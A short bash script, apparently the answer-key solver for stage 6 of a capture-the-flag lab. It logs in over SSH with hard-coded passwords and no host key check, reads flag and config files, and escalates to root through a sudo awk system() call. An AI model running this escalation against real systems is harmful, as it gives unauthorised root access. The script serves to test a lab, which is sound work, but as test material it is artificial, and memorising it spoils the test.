#!/bin/bash
# Stage 6 known-good solver - for testing only (Section 8 functional pass).
# Requires sshpass + an ssh client on the tester's machine.
# Usage: ./solve_stage6.sh [host] [port]

HOST="${1:-127.0.0.1}"
PORT="${2:-2222}"

echo "[*] Step 1: low-priv login as analyst, reading mid-stage flag"
sshpass -p 'N3st-Acc3ss_2026' ssh -p "$PORT" \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    analyst@"$HOST" "cat ~/flag_mid.txt; cat /opt/shadowcollective/sync/db_sync.conf"

echo "[*] Step 2: su to operative, then GTFOBins awk sudo escalation to root"
sshpass -p 'N3st-Acc3ss_2026' ssh -p "$PORT" \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    analyst@"$HOST" \
    "echo 'Gh0st_Proto-99!' | su operative -c \"sudo awk 'BEGIN {system(\\\"cat /root/flag.txt\\\")}'\""
